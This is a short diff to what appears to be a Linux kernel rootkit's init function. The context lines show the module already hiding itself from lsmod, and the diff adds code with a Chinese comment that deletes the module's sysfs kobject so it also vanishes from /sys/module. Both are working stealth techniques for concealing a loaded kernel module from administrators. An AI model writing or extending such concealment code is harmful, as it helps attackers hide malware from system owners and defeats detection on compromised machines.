@@ -184,6 +184,12 @@ int __init driver_entry(void)
 	mutex_unlock(&module_mutex);
 	printk(KERN_INFO "[+] Module hidden from lsmod\n");
 
+    // 尝试隐藏 /sys/module/<模块名> 目录
+    if (THIS_MODULE->mkobj.kobj.state_in_sysfs) {
+        kobject_del(&THIS_MODULE->mkobj.kobj);
+        printk(KERN_INFO "[+] Module sysfs entry hidden\n");
+    }
+
 	return 0;
 }
 
